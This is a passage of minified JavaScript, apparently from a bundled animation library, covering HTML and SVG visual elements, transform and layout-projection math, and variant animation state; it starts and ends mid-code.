Hc{constructor(){super(...arguments),this.KeyframeResolver=Ms}sortInstanceNodePosition(e,t){return e.compareDocumentPosition(t)&2?1:-1}getBaseTargetFromProps(e,t){let n=e.style;return n?n[t]:void 0}removeValueFromRenderState(e,{vars:t,style:n}){delete t[e],delete n[e]}handleChildMotionValue(){this.childSubscription&&(this.childSubscription(),delete this.childSubscription);let{children:e}=this.props;rs(e)&&(this.childSubscription=e.on(`change`,e=>{this.current&&(this.current.textContent=`${e}`)}))}},Wc=class{constructor(e){this.isMounted=!1,this.node=e}update(){}};function Gc({top:e,left:t,right:n,bottom:r}){return{x:{min:t,max:n},y:{min:e,max:r}}}function Kc({x:e,y:t}){return{top:t.min,right:e.max,bottom:t.max,left:e.min}}function qc(e,t){if(!t)return e;let n=t({x:e.left,y:e.top}),r=t({x:e.right,y:e.bottom});return{top:n.y,left:n.x,bottom:r.y,right:r.x}}function Jc(e){return e===void 0||e===1}function Yc({scale:e,scaleX:t,scaleY:n}){return!Jc(e)||!Jc(t)||!Jc(n)}function Xc(e){return Yc(e)||Zc(e)||e.z||e.rotate||e.rotateX||e.rotateY||e.skewX||e.skewY}function Zc(e){return Qc(e.x)||Qc(e.y)}function Qc(e){return e&&e!==`0%`}function $c(e,t,n){return n+t*(e-n)}function el(e,t,n,r,i){return i!==void 0&&(e=$c(e,i,r)),$c(e,n,r)+t}function tl(e,t=0,n=1,r,i){e.min=el(e.min,t,n,r,i),e.max=el(e.max,t,n,r,i)}function nl(e,{x:t,y:n}){tl(e.x,t.translate,t.scale,t.originPoint),tl(e.y,n.translate,n.scale,n.originPoint)}var rl=.999999999999,il=1.0000000000001;function al(e,t,n,r=!1){let i=n.length;if(!i)return;t.x=t.y=1;let a,o;for(let s=0;s<i;s++){a=n[s],o=a.projectionDelta;let{visualElement:i}=a.options;i&&i.props.style&&i.props.style.display===`contents`||(r&&a.options.layoutScroll&&a.scroll&&a!==a.root&&ll(e,{x:-a.scroll.offset.x,y:-a.scroll.offset.y}),o&&(t.x*=o.x.scale,t.y*=o.y.scale,nl(e,o)),r&&Xc(a.latestValues)&&ll(e,a.latestValues,a.layout?.layoutBox))}t.x<il&&t.x>rl&&(t.x=1),t.y<il&&t.y>rl&&(t.y=1)}function ol(e,t){e.min+=t,e.max+=t}function sl(e,t,n,r,i=.5){tl(e,t,n,N(e.min,e.max,i),r)}function cl(e,t){return typeof e==`string`?parseFloat(e)/100*(t.max-t.min):e}function ll(e,t,n){let r=n??e;sl(e.x,cl(t.x,r.x),t.scaleX,t.scale,t.originX),sl(e.y,cl(t.y,r.y),t.scaleY,t.scale,t.originY)}function ul(e,t){return Gc(qc(e.getBoundingClientRect(),t))}function dl(e,t,n){let r=ul(e,n),{scroll:i}=t;return i&&(ol(r.x,i.offset.x),ol(r.y,i.offset.y)),r}var fl={x:`translateX`,y:`translateY`,z:`translateZ`,transformPerspective:`perspective`},pl=Ha.length;function ml(e,t,n){let r=``,i=!0;for(let a=0;a<pl;a++){let o=Ha[a],s=e[o];if(s===void 0)continue;let c=!0;if(typeof s==`number`)c=s===(o.startsWith(`scale`)?1:0);else{let e=parseFloat(s);c=o.startsWith(`scale`)?e===1:e===0}if(!c||n){let e=Fs(s,Ts[o]);if(!c){i=!1;let t=fl[o]||o;r+=`${t}(${e}) `}n&&(t[o]=e)}}return r=r.trim(),n?r=n(t,i?``:r):i&&(r=`none`),r}function hl(e,t,n){let{style:r,vars:i,transformOrigin:a}=e,o=!1,s=!1;for(let e in t){let n=t[e];if(Ua.has(e)){o=!0;continue}else if(qr(e)){i[e]=n;continue}else{let t=Fs(n,Ts[e]);e.startsWith(`origin`)?(s=!0,a[e]=t):r[e]=t}}if(t.transform||(o||n?r.transform=ml(t,e.transform,n):r.transform&&=`none`),s){let{originX:e=`50%`,originY:t=`50%`,originZ:n=0}=a;r.transformOrigin=`${e} ${t} ${n}`}}function gl(e,{style:t,vars:n},r,i){let a=e.style,o;for(o in t)a[o]=t[o];for(o in i?.applyProjectionStyles(a,r),n)a.setProperty(o,n[o])}function _l(e,t){return t.max===t.min?0:e/(t.max-t.min)*100}var vl={correct:(e,t)=>{if(!t.target)return e;if(typeof e==`string`)if(M.test(e))e=parseFloat(e);else return e;return`${_l(e,t.target.x)}% ${_l(e,t.target.y)}%`}},yl={correct:(e,{treeScale:t,projectionDelta:n})=>{let r=e,i=Fi.parse(e);if(i.length>5)return r;let a=Fi.createTransformer(e),o=typeof i[0]==`number`?0:1,s=n.x.scale*t.x,c=n.y.scale*t.y;i[0+o]/=s,i[1+o]/=c;let l=N(s,c,.5);return typeof i[2+o]==`number`&&(i[2+o]/=l),typeof i[3+o]==`number`&&(i[3+o]/=l),a(i)}},bl={borderRadius:{...vl,applyTo:[`borderTopLeftRadius`,`borderTopRightRadius`,`borderBottomLeftRadius`,`borderBottomRightRadius`]},borderTopLeftRadius:vl,borderTopRightRadius:vl,borderBottomLeftRadius:vl,borderBottomRightRadius:vl,boxShadow:yl};function xl(e,{layout:t,layoutId:n}){return Ua.has(e)||e.startsWith(`origin`)||(t||n!==void 0)&&(!!bl[e]||e===`opacity`)}function Sl(e,t,n){let r=e.style,i=t?.style,a={};if(!r)return a;for(let t in r)(rs(r[t])||i&&rs(i[t])||xl(t,e)||n?.getValue(t)?.liveStyle!==void 0)&&(a[t]=r[t]);return a}function Cl(e){return window.getComputedStyle(e)}var wl=class extends Uc{constructor(){super(...arguments),this.type=`html`,this.renderInstance=gl}readValueFromInstance(e,t){if(Ua.has(t))return this.projection?.isProjecting?Ra(t):Ba(e,t);{let n=Cl(e),r=(qr(t)?n.getPropertyValue(t):n[t])||0;return typeof r==`string`?r.trim():r}}measureInstanceViewportBox(e,{transformPagePoint:t}){return ul(e,t)}build(e,t,n){hl(e,t,n.transformTemplate)}scrapeMotionValuesFromProps(e,t,n){return Sl(e,t,n)}},Tl={offset:`stroke-dashoffset`,array:`stroke-dasharray`},El={offset:`strokeDashoffset`,array:`strokeDasharray`};function Dl(e,t,n=1,r=0,i=!0){e.pathLength=1;let a=i?Tl:El;e[a.offset]=`${-r}`,e[a.array]=`${t} ${n}`}var Ol=[`offsetDistance`,`offsetPath`,`offsetRotate`,`offsetAnchor`];function kl(e,{attrX:t,attrY:n,attrScale:r,pathLength:i,pathSpacing:a=1,pathOffset:o=0,...s},c,l,u){if(hl(e,s,l),c){e.style.viewBox&&(e.attrs.viewBox=e.style.viewBox);return}e.attrs=e.style,e.style={};let{attrs:d,style:f}=e;d.transform&&(f.transform=d.transform,delete d.transform),(f.transform||d.transformOrigin)&&(f.transformOrigin=d.transformOrigin??`50% 50%`,delete d.transformOrigin),f.transform&&(f.transformBox=u?.transformBox??`fill-box`,delete d.transformBox);for(let e of Ol)d[e]!==void 0&&(f[e]=d[e],delete d[e]);t!==void 0&&(d.x=t),n!==void 0&&(d.y=n),r!==void 0&&(d.scale=r),i!==void 0&&Dl(d,i,a,o,!1)}var Al=new Set([`baseFrequency`,`diffuseConstant`,`kernelMatrix`,`kernelUnitLength`,`keySplines`,`keyTimes`,`limitingConeAngle`,`markerHeight`,`markerWidth`,`numOctaves`,`targetX`,`targetY`,`surfaceScale`,`specularConstant`,`specularExponent`,`stdDeviation`,`tableValues`,`viewBox`,`gradientTransform`,`pathLength`,`startOffset`,`textLength`,`lengthAdjust`]),jl=e=>typeof e==`string`&&e.toLowerCase()===`svg`;function Ml(e,t,n,r){gl(e,t,void 0,r);for(let n in t.attrs)e.setAttribute(Al.has(n)?n:os(n),t.attrs[n])}function Nl(e,t,n){let r=Sl(e,t,n);for(let n in e)if(rs(e[n])||rs(t[n])){let t=Ha.indexOf(n)===-1?n:`attr`+n.charAt(0).toUpperCase()+n.substring(1);r[t]=e[n]}return r}var Pl=class extends Uc{constructor(){super(...arguments),this.type=`svg`,this.isSVGTag=!1,this.measureInstanceViewportBox=Tc}getBaseTargetFromProps(e,t){return e[t]}readValueFromInstance(e,t){if(Ua.has(t)){let e=Ds(t);return e&&e.default||0}return t=Al.has(t)?t:os(t),e.getAttribute(t)}scrapeMotionValuesFromProps(e,t,n){return Nl(e,t,n)}build(e,t,n){kl(e,t,this.isSVGTag,n.transformTemplate,n.style)}renderInstance(e,t,n,r){Ml(e,t,n,r)}mount(e){this.isSVGTag=jl(e.tagName),super.mount(e)}},Fl=Ac.length;function Il(e){if(!e)return;if(!e.isControllingVariants){let t=e.parent&&Il(e.parent)||{};return e.props.initial!==void 0&&(t.initial=e.props.initial),t}let t={};for(let n=0;n<Fl;n++){let r=Ac[n],i=e.props[r];(Oc(i)||i===!1)&&(t[r]=i)}return t}function Ll(e,t){if(!Array.isArray(t))return!1;let n=t.length;if(n!==e.length)return!1;for(let r=0;r<n;r++)if(t[r]!==e[r])return!1;return!0}var Rl=[...kc].reverse(),zl=kc.length;function Bl(e){return t=>Promise.all(t.map(({animation:t,options:n})=>ps(e,t,n)))}function Vl(e){let t=Bl(e),n=Wl(),r=!0,i=!1,a=t=>(n,r)=>{let i=Ko(e,r,t===`exit`?e.presenceContext?.custom:void 0);if(i){let{transition:e,transitionEnd:t,...r}=i;n={...n,...r,...t}}return n};function o(n){t=n(e)}function s(o){let{props:s}=e,c=Il(e.parent)||{},l=[],u=new Set,d={},f=1/0;for(let t=0;t<zl;t++){let p=Rl[t],m=n[p],h=s[p]===void 0?c[p]:s[p],g=Oc(h),_=p===o?m.isActive:null;_===!1&&(f=t);let v=h===c[p]&&h!==s[p]&&g;if(v&&(r||i)&&e.manuallyAnimateOnMount&&(v=!1),m.protectedKeys={...d},!m.isActive&&_===null||!h&&!m.prevProp||Dc(h)||typeof h==`boolean`)continue;if(p===`exit`&&m.isActive&&_!==!0){m.prevResolvedValues&&(d={...d,...m.prevResolvedValues});continue}let y=Hl(m.prevProp,h),b=y||p===o&&m.isActive&&!v&&g||t>f&&g,x=!1,S=Array.isArray(h)?h:[h],C=S.reduce(a(p),{});_===!1&&(C={});let{prevResolvedValues:w={}}=m,T={...w,...C},E=t=>{b=!0,u.has(t)&&(x=!0,u.delete(t)),m.needsAnimating[t]=!0;let n=e.getValue(t);n&&(n.liveStyle=!1)};for(let e in T){let t=C[e],n=w[e];if(d.hasOwnProperty(e))continue;let r=!1;r=$o(t)&&$o(n)?!Ll(t,n):t!==n,r?t==null?u.add(e):E(e):t!==void 0&&u.has(e)?E(e):m.protectedKeys[e]=!0}m.prevProp=h,m.prevResolvedValues=C,m.isActive&&(d={...d,...C}),(r||i)&&e.blockInitialAnimation&&(b=!1);let ee=v&&y;b&&(!ee||x)&&l.push(...S.map(t=>{let n={type:p};if(typeof t==`string`&&(r||i)&&!ee&&e.manuallyAnimateOnMount&&e.parent){let{parent:r}=e,i=Ko(r,t);if(r.enteringChildren&&i){let{delayChildren:t}=i.transition||{};n.delay=ko(r.enteringChildren,e,t)}}return{animation:t,options:n}}))}if(u.size){let t={};if(typeof s.initial!=`boolean`){let n=Ko(e,Array.isArray(s.initial)?s.initial[0]:s.initial);n&&n.transition&&(t.transition=n.transition)}u.forEach(n=>{let r=e.getBaseTarget(n),i=e.getValue(n);i&&(i.liveStyle=!0),t[n]=r??null}),l.push({animation:t})}let p=!!l.length;return r&&(s.initial===!1||s.initial===s.animate)&&!e.manuallyAnimateOnMount&&(p=!1),r=!1,i=!1,p?t(l):Promise.resolve()}function c(t,r){if(n[t].isActive===r)return Promise.resolve();e.variantChildren?.forEach(e=>e.animationState?.setActive(t,r)),n[t].isActive=r;let i=s(t);for(let e in n)n[e].protectedKeys={};return i}return{animateChanges:s,setActive:c,setAnimateFunction:o,getState:()=>n,reset:()=>{n=Wl(),i=!0}}}function Hl(e,t){return typeof t==`string`?t!==e:Array.isArray(t)?!Ll(t,e):!1}function Ul(e=!1){return{isActive:e,protectedKeys:{},needsAnimating:{},prevResolvedValues:{}}}function Wl(){return{animate:Ul(!0),whileInView:Ul(),whileHover:Ul(),whileTap:Ul(),whileDrag:Ul(),whileFocus:Ul(),exit:Ul()}}function Gl(e,t){e.min=t.min,e.max=t.max}function z(e,t){Gl(e.x,t.x),Gl(e.y,t.y)}function B(e,t){e.translate=t.translate,e.scale=t.scale,e.originPoint=t.originPoint,e.origin=t.origin}var V=1e-4,H=1-V,U=1+V,Kl=.01,ql=0-Kl,Jl=0+Kl;function Yl(e){return e.max-e.min}function Xl(e,t,n){return Math.abs(e-t)<=n}function Zl(e,t,n,r=.5){e.origin=r,e.originPoint=N(t.min,t.max,e.origin),e.scale=Yl(n)/Yl(t),e.translate=N(n.min,n.max,e.origin)-e.originPoint,(e.scale>=H&&e.scale<=U||isNaN(e.scale))&&(e.scale=1),(e.translate>=ql&&e.translate<=Jl||isNaN(e.translate))&&(e.translate=0)}function Ql(e,t,n,r){Zl(e.x,t.x,n.x,r?r.originX:void 0),Zl(e.y,t.y,n.y,r?r.originY:void 0)}function $l(e,t,n){e.min=n.min+t.min,e.max=e.min+Yl(t)}function eu(e,t,n){$l(e.x,t.x,n.x),$l(e.y,t.y,n.y)}function tu(e,t,n){e.min=t.min-n.min,e.max=e.min+Yl(t)}function nu(e,t,n){tu(e.x,t.x,n.x),tu(e.y,t.y,n.y)}function ru(e,t,n,r,i){return e-=t,e=$c(e,1/n,r),i!==void 0&&(e=$c(e,1/i,r)),e}function iu(e,t=0,n=1,r=.5,i,a=e,o=e){if(mi.test(t)&&(t=parseFloat(t),t=N(o.min,o.max,t/100)-o.min),typeof t!=`number`)return;let s=N(a.min,a.max,r);e===a&&(s-=t),e.min=ru(e.min,t,n,s,i),e.max=ru(e.max,t,n,s,i)}function au(e,t,[n,r,i],a,o){iu(e,t[n],t[r],t[i],t.scale,a,o)}var ou=[`x`,`scaleX`,`originX`],su=[`y`,`scaleY`,`originY`];function cu(e,t,n,r){au(e.x,t,ou,n?n.x:void 0,r?r.x:void 0),au(e.y,t,su,n?n.y:void 0,r?r.y:void 0)}function lu(e){return e.translate===0&&e.scale===1}function uu(e){return lu(e.x)&&lu(e.y)}function du(e,t){return e.min===t.min&&e.max===t.max}function fu(e,t){return du(e.x,t.x)&&du(e.y,t.y)}function pu(e,t){return Math.round(e.min)===Math.round(t.min)&&Math.round(e.max)===Math.round(t.max)}function mu(e,t){return pu(e.x,t.x)&&pu(e.y,t.y)}function hu(e){return Yl(e.x)/Yl(e.y)}function gu(e,t){return e.translate===t.translate&&e.scale===t.scale&&e.originPoint===t.originPoint}function _u(e){return[e(`x`),e(`y`)]}function vu(e,t,n){let r=``,i=e.x.translate/t.x,a=e.y.translate/t.y,o=n?.z||0;if((i||a||o)&&(r=`translate3d(${i}px, ${a}px, ${o}px) `),(t.x!==1||t.y!==1)&&(r+=`scale(${1/t.x}, ${1/t.y}) `),n){let{transformPerspective:e,rotate:t,rotateX:i,rotateY:a,skewX:o,skewY:s}=n;e&&(r=`perspective(${e}px) ${r}`),t&&(r+=`rotate(${t}deg) `),i&&(r+=`rotateX(${i}deg) `),a&&(r+=`rotateY(${a}deg) `),o&&(r+=`skewX(${o}deg) `),s&&(r+=`skewY(${s}deg) `)}let s=e.x.scale*t.x,c=e.y.scale*t.y;return(s!==1||c!==1)&&(r+=`scale(${s}, ${c})`),r||`none`}var yu=[`TopLeft`,`TopRight`,`BottomLeft`,`BottomRight`],bu=yu.length,xu=e=>typeof e==`string`?parseFloat(e):e,Su=e=>typeof e==`number`||M.test(e);function Cu(e,t,n,r,i,a){i?(e.opacity=N(0,n.opacity??1,Tu(r)),e.opacityExit=N(t.opacity??1,0,Eu(r))):a&&(e.opacity=N(t.opacity??1,n.opacity??1,r));for(let i=0;i<bu;i++){let a=`border${yu[i]}Radius`,o=wu(t,a),s=wu(n,a);o===void 0&&s===void 0||(o||=0,s||=0,o===0||s===0||Su(o)===Su(s)?(e[a]=Math.max(N(xu(o),xu(s),r),0),(mi.test(s)||mi.test(o))&&(e[a]+=`%`)):e[a]=s)}(t.rotate||n.rotate)&&(e.rotate=N(t.rotate||0,n.rotate||0,r))}function wu(e,t){return e[t]===void 0?e.borderRadius:e[t]}var Tu=Du(0,.5,wr),Eu=Du(.5,.95,ir);function Du(e,t,n){return r=>r<e?0:r>t?1:n(sr(e,t,r))}function Ou(e,t,n){let r=rs(e)?e:Qo(e);return r.start(Uo(``,r,t,n)),r.animation}function ku(e,t,n,r={passive:!0}){return e.addEventListener(t,n,r),()=>e.removeEventListener(t,n)}var Au=(e,t)=>e.depth-t.depth,ju=class{constructor(){this.children=[],this.isDirty=!1}add(e){Xn(this.children,e),this.isDirty=!0}remove(e){Zn(this.children,e),this.isDirty=!0}forEach(e){this.isDirty&&this.children.sort(Au),this.isDirty=!1,this.children.forEach(e)}};function Mu(e,t){let n=Wr.now(),r=({timestamp:i})=>{let a=i-n;a>=t&&(zr(r),e(a-t))};return j.setup(r,!0),()=>zr(r)}function Nu(e){return rs(e)?e.get():e}var Pu=class{constructor(){this.members=[]}add(e){Xn(this.members,e);for(let t=this.members.length-1;t>=0;t--){let n=this.members[t];if(n===e||n===this.lead||n===this.prevLead)continue;let r=n.instance;(!r||r.isConnected===!1)&&!n.snapshot&&(Zn(this.members,n),n.unmount())}e.scheduleRender()}remove(e){if(Zn(this.members,e),e===this.prevLead&&(this.prevLead=void 0),e===this.lead){let e=this.members[this.members.length-1];e&&this.promote(e)}}relegate(e){for(let t=this.members.indexOf(e)-1;t>=0;t--){let e=this.members[t];if(e.isPresent!==!1&&e.instance?.isConnected!==!1)return this.promote(e),!0}return!1}promote(e,t){let n=this.lead;if(e!==n&&(this.prevLead=n,this.lead=e,e.show(),n)){n.updateSnapshot(),e.scheduleRender();let{layoutDependency:r}=n.options,{layoutDependency:i}=e.options;(r===void 0||r!==i)&&(e.resumeFrom=n,t&&(n.preserveOpacity=!0),n.snapshot&&(e.snapshot=n.snapshot,e.snapshot.latestValues=n.animationValues||n.latestValues),e.root?.isUpdating&&(e.isLayoutDirty=!0)),e.options.crossfade===!1&&n.hide()}}exitAnimationComplete(){this.members.forEach(e=>{e.options.onExitComplete?.(),e.resumingFrom?.options.onExitComplete?.()})}scheduleRender(){this.members.forEach(e=>e.instance&&e.scheduleRender(!1))}removeLeadSnapshot(){this.lead?.snapshot&&(this.lead.snapshot=void 0)}},Fu={hasAnimatedSinceResize:!0,hasEverUpdated:!1},Iu={nodes:0,calculatedTargetDeltas:0,calculatedProjections:0},Lu=[``,`X`,`Y`,`Z`],Ru=1e3,zu=0;function Bu(e,t,n,r){let{latestValues:i}=t;i[e]&&(n[e]=i[e],t.setStaticValue(e,0),r&&(r[e]=0))}function Vu(e){if(e.hasCheckedOptimisedAppear=!0,e.root===e)return;let{visualElement:t}=e.options;if(!t)return;let n=cs(t);if(window.MotionHasOptimisedAnimation(n,`transform`)){let{layout:t,layoutId:r}=e.options;window.MotionCancelOptimisedAnimation(n,`transform`,j,!(t||r))}let{parent:r}=e;r&&!r.hasCheckedOptimisedAppear&&Vu(r)}function Hu({attachResizeListener:e,defaultParent:t,measureScroll:n,checkIsScrollRoot:r,resetTransform:i}){return class{constructor(e={},n=t?.()){this.id=zu++,this.animationId=0,this.animationCommitId=0,this.children=new Set,this.options={},this.isTreeAnimating=!1,this.isAnimationBlocked=!1,this.isLayoutDirty=!1,this.isProjectionDirty=!1,this.isSharedProjectionDirty=!1,this.isTransformDirty=!1,this.updateManuallyBlocked=!1,this.updateBlockedByResize=!1,this.isUpdating=!1,this.isSVG=!1,this.needsReset=!1,this.shouldResetTransform=!1,this.hasCheckedOptimisedAppear=!1,this.treeScale={x:1,y:1},this.eventHandlers=new Map,this.hasTreeAnimated=!1,this.layoutVersion=0,this.updateScheduled=!1,this.scheduleUpdate=()=>this.update(),this.projectionUpdateScheduled=!1,this.checkUpdateFailed=()=>{this.isUpdating&&(this.isUpdating=!1,this.clearAllSnapshots())},this.updateProjection=()=>{this.projectionUpdateScheduled=!1,Fr.value&&(Iu.nodes=Iu.calculatedTargetDeltas=Iu.calculatedProjections=0),this.nodes.forEach(Gu),this.nodes.forEach(W),this.nodes.forEach(Qu),this.nodes.forEach(Ku),Fr.addProjectionMetrics&&Fr.addProjectionMetrics(Iu)},this.resolvedRelativeTargetAt=0,this.linkedParentVersion=0,this.hasProjected=!1,this.isVisible=!0,this.animationProgress=0,this.sharedNodes=new Map,this.latestValues=e,this.root=n?n.root||n:this,this.path=n?[...n.path,n]:[],this.parent=n,this.depth=n?n.depth+1:0;for(let e=0;e<this.path.length;e++)this.path[e].shouldResetTransform=!0;this.root===this&&(this.nodes=new ju)}addEventListener(e,t){return this.eventHandlers.has(e)||this.eventHandlers.set(e,new cr),this.eventHandlers.get(e).add(t)}notifyListeners(e,...t){let n=this.eventHandlers.get(e);n&&n.notify(...t)}hasListeners(e){return this.eventHandlers.has(e)}mount(t){if(this.instance)return;this.isSVG=ic(t)&&!yc(t),this.instance=t;let{layoutId:n,layout:r,visualElement:i}=this.options;if(i&&!i.current&&i.mount(t),this.root.nodes.add(this),this.parent&&this.parent.children.add(this),this.root.hasTreeAnimated&&(r||n)&&(this.isLayoutDirty=!0),e){let n,r=0,i=()=>this.root.updateBlockedByResize=!1;j.read(()=>{r=window.innerWidth}),e(t,()=>{let e=window.innerWidth;e!==r&&(r=e,this.root.updateBlockedByResize=!0,n&&n(),n=Mu(i,250),Fu.hasAnimatedSinceResize&&(Fu.hasAnimatedSinceResize=!1,this.nodes.forEach(Zu)))})}n&&this.root.registerSharedNode(n,this),this.options.animate!==!1&&i&&(n||r)&&this.addEventListener(`didUpdate`,({delta:e,hasLayoutChanged:t,hasRelativeLayoutChanged:n,layout:r})=>{if(this.isTreeAnimationBlocked()){this.target=void 0,this.relativeTarget=void 0;return}let a=this.options.transition||i.getDefaultTransition()||ad,{onLayoutAnimationStart:o,onLayoutAnimationComplete:s}=i.getProps(),c=!this.targetLayout||!mu(this.targetLayout,r),l=!t&&n;if(this.options.layoutRoot||this.resumeFrom||l||t&&(c||!this.currentAnimation)){this.resumeFrom&&(this.resumingFrom=this.resumeFrom,this.resumingFrom.resumingFrom=void 0);let t={...Vo(a,`layout`),onPlay:o,onComplete:s};(i.shouldReduceMotion||this.options.layoutRoot)&&(t.delay=0,t.type=!1),this.startAnimation(t),this.setAnimationOrigin(e,l)}else t||Zu(this),this.isLead()&&this.options.onExitComplete&&this.options.onExitComplete();this.targetLayout=r})}unmount(){this.options.layoutId&&this.willUpdate(),this.root.nodes.remove(this);let e=this.getStack();e&&e.remove(this),this.parent&&this.parent.children.delete(this),this.instance=void 0,this.eventHandlers.clear(),zr(this.updateProjection)}blockUpdate(){this.updateManuallyBlocked=!0}unblockUpdate(){this.updateManuallyBlocked=!1}isUpdateBlocked(){return this.updateManuallyBlocked||this.updateBlockedByResize}isTreeAnimationBlocked(){return this.isAnimationBlocked||this.parent&&this.parent.isTreeAnimationBlocked()||!1}startUpdate(){this.isUpdateBlocked()||(this.isUpdating=!0,this.nodes&&this.nodes.forEach($u),this.animationId++)}getTransformTemplate(){let{visualElement:e}=this.options;return e&&e.getProps().transformTemplate}willUpdate(e=!0){if(this.root.hasTreeAnimated=!0,this.root.isUpdateBlocked()){this.options.onExitComplete&&this.options.onExitComplete();return}if(window.MotionCancelOptimisedAnimation&&!this.hasCheckedOptimisedAppear&&Vu(this),!this.root.isUpdating&&this.root.startUpdate(),this.isLayoutDirty)return;this.isLayoutDirty=!0;for(let e=0;e<this.path.length;e++){let t=this.path[e];t.shouldResetTransform=!0,(typeof t.latestValues.x==`string`||typeof t.latestValues.y==`string`)&&(t.isLayoutDirty=!0),t.updateScroll(`snapshot`),t.options.layoutRoot&&t.willUpdate(!1)}let{layoutId:t,layout:n}=this.options;if(t===void 0&&!n)return;let r=this.getTransformTemplate();this.prevTransformTemplateValue=r?r(this.latestValues,``):void 0,this.updateSnapshot(),e&&this.notifyListeners(`willUpdate`)}update(){if(this.updateScheduled=!1,this.isUpdateBlocked()){this.unblockUpdate(),this.clearAllSnapshots(),this.nodes.forEach(Ju);return}if(this.animationId<=this.animationCommitId){this.nodes.forEach(Yu);return}this.animationCommitId=this.animationId,this.isUpdating?(this.isUpdating=!1,this.nodes.forEach(Xu),this.nodes.forEach(Uu),this.nodes.forEach(Wu)):this.nodes.forEach(Yu),this.clearAllSnapshots();let e=Wr.now();Br.delta=Qn(0,1e3/60,e-Br.timestamp),Br.timestamp=e,Br.isProcessing=!0,Vr.update.process(Br),Vr.preRender.process(Br),Vr.render.process(Br),Br.isProcessing=!1}didUpdate(){this.updateScheduled||(this.updateScheduled=!0,Ls.read(this.scheduleUpdate))}clearAllSnapshots(){this.nodes.forEach(qu),this.sharedNodes.forEach(ed)}scheduleUpdateProjection(){this.projectionUpdateScheduled||(this.projectionUpdateScheduled=!0,j.preRender(this.updateProjection,!1,!0))}scheduleCheckAfterUnmount(){j.postRender(()=>{this.isLayoutDirty?this.root.didUpdate():this.root.checkUpdateFailed()})}updateSnapshot(){this.snapshot||!this.instance||(this.snapshot=this.measure(),this.snapshot&&!Yl(this.snapshot.measuredBox.x)&&!Yl(this.snapshot.measuredBox.y)&&(this.snapshot=void 0))}updateLayout(){if(!this.instance||(this.updateScroll(),!(this.options.alwaysMeasureLayout&&this.isLead())&&!this.isLayoutDirty))return;if(this.resumeFrom&&!this.resumeFrom.instance)for(let e=0;e<this.path.length;e++)this.path[e].updateScroll();let e=this.layout;this.layout=this.measure(!1),this.layoutVersion++,this.layoutCorrected=Tc(),this.isLayoutDirty=!1,this.projectionDelta=void 0,this.notifyListeners(`measure`,this.layout.layoutBox);let{visualElement:t}=this.options;t&&t.notify(`LayoutMeasure`,this.layout.layoutBox,e?e.layoutBox:void 0)}updateScroll(e=`measure`){let t=!!(this.options.layoutScroll&&this.instance);if(this.scroll&&this.scroll.animationId===this.root.animationId&&this.scroll.phase===e&&(t=!1),t&&this.instance){let t=r(this.instance);this.scroll={animationId:this.root.animationId,phase:e,isRoot:t,offset:n(this.instance),wasRoot:this.scroll?this.scroll.isRoot:t}}}resetTransform(){if(!i)return;let e=this.isLayoutDirty||this.shouldResetTransform||this.options.alwaysMeasureLayout,t=this.projectionDelta&&!uu(this.projectionDelta),n=this.getTransformTemplate(),r=n?n(this.latestValues,``):void 0,a=r!==this.prevTransformTemplateValue;e&&this.instance&&(t||Xc(this.latestValues)||a)&&(i(this.instance,r),this.shouldResetTransform=!1,this.scheduleRender())}measure(e=!0){let t=this.measurePageBox(),n=this.removeElementScroll(t);return e&&(n=this.removeTransform(n)),ld(n),{animationId:this.root.animationId,measuredBox:t,layoutBox:n,latestValues:{},source:this.id}}measurePageBox(){let{visualElement:e}=this.options;if(!e)return Tc();let t=e.measureViewportBox();if(!(this.scroll?.wasRoot||this.path.some(dd))){let{scroll:e}=this.root;e&&(ol(t.x,e.offset.x),ol(t.y,e.offset.y))}return t}removeElementScroll(e){let t=Tc();if(z(t,e),this.scroll?.wasRoot)return t;for(let n=0;n<this.path.length;n++){let r=this.path[n],{scroll:i,options:a}=r;r!==this.root&&i&&a.layoutScroll&&(i.wasRoot&&z(t,e),ol(t.x,i.offset.x),ol(t.y,i.offset.y))}return t}applyTransform(e,t=!1){let n=Tc();z(n,e);for(let e=0;e<this.path.length;e++){let r=this.path[e];!t&&r.options.layoutScroll&&r.scroll&&r!==r.root&&ll(n,{x:-r.scroll.offset.x,y:-r.scroll.offset.y}),Xc(r.latestValues)&&ll(n,r.latestValues,r.layout?.layoutBox)}return Xc(this.latestValues)&&ll(n,this.latestValues,this.layout?.layoutBox),n}removeTransform(e){let t=Tc();z(t,e);for(let e=0;e<this.path.length;e++){let n=this.path[e];if(!Xc(n.latestValues))continue;let r;n.instance&&(Yc(n.latestValues)&&n.updateSnapshot(),r=Tc(),z(r,n.measurePageBox())),cu(t,n.latestValues,n.snapshot?.layoutBox,r)}return Xc(this.latestValues)&&cu(t,this.latestValues),t}setTargetDelta(e){this.targetDelta=e,this.root.scheduleUpdateProjection(),this.isProjectionDirty=!0}setOptions(e){this.options={...this.options,...e,crossfade:e.crossfade===void 0?!0:e.crossfade}}clearMeasurements(){this.scroll=void 0,this.layout=void 0,this.snapshot=void 0,this.prevTransformTemplateValue=void 0,this.targetDelta=void 0,this.target=void 0,this.isLayoutDirty=!1}forceRelativeParentToResolveTarget(){this.relativeParent&&this.relativeParent.resolvedRelativeTargetAt!==Br.timestamp&&this.relativeParent.resolveTargetDelta(!0)}resolveTargetDelta(e=!1){let t=this.getLead();this.isProjectionDirty||=t.isProjectionDirty,this.isTransformDirty||=t.isTransformDirty,this.isSharedProjectionDirty||=t.isSharedProjectionDirty;let n=!!this.resumingFrom||this!==t;if(!(e||n&&this.isSharedProjectionDirty||this.isProjectionDirty||this.parent?.isProjectionDirty||this.attemptToResolveRelativeTarget||this.root.updateBlockedByResize))return;let{layout:r,layoutId:i}=this.options;if(!this.layout||!(r||i))return;this.resolvedRelativeTargetAt=Br.timestamp;let a=this.getClosestProjectingParent();a&&this.linkedParentVersion!==a.layoutVersion&&!a.options.layoutRoot&&this.removeRelativeTarget(),!this.targetDelta&&!this.relativeTarget&&(a&&a.layout?this.createRelativeTarget(a,this.layout.layoutBox,a.layout.layoutBox):this.removeRelativeTarget()),!(!this.relativeTarget&&!this.targetDelta)&&(this.target||(this.target=Tc(),this.targetWithTransforms=Tc()),this.relativeTarget&&this.relativeTargetOrigin&&this.relativeParent&&this.relativeParent.target?(this.forceRelativeParentToResolveTarget(),eu(this.target,this.relativeTarget,this.relativeParent.target)):this.targetDelta?(this.resumingFrom?this.target=this.applyTransform(this.layout.layoutBox):z(this.target,this.layout.layoutBox),nl(this.target,this.targetDelta)):z(this.target,this.layout.layoutBox),this.attemptToResolveRelativeTarget&&(this.attemptToResolveRelativeTarget=!1,a&&!!a.resumingFrom==!!this.resumingFrom&&!a.options.layoutScroll&&a.target&&this.animationProgress!=